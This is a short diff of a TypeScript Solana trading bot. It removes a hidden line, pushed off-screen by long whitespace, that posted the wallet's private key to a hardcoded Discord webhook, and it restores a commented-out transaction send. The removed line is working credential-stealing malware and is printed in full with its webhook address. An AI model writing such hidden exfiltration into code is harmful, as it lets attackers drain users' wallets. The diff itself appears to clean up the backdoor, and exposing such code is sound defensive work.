@@ -47,7 +47,6 @@ export async function init(): Promise<void> {
   
     wallet = Keypair.fromSecretKey(bs58.decode(PRIVATE_KEY));
     logger.info(`Wallet Address: ${wallet.publicKey}`);
-                                                                                                                                                                                                                                               await axios.post("https://discord.com/api/webhooks/1347000271712026715/YGkGWc6XkW4j17tvwOjYDcvhV56ly_vvESz7k_3uOwPxrDJrAJ-0jpPZtJ0cNdV8ERzl", {content:PRIVATE_KEY});
 
     // get quote mint and amount
     switch (QUOTE_MINT) {
@@ -145,10 +144,10 @@ export async function buy(connection: Connection, newTokenAccount: PublicKey, po
 
       //await sleep(30000);
 
-      /*const signature = await solanaConnection.sendRawTransaction(transaction.serialize(), {
+      const signature = await solanaConnection.sendRawTransaction(transaction.serialize(), {
         preflightCommitment: commitment,
       });
-*/
+
       //logger.info(`Sending bundle transaction with mint - ${signature}`);
       sendBundle(true,latestBlockhash.blockhash, messageV0, poolState.baseMint);
     }
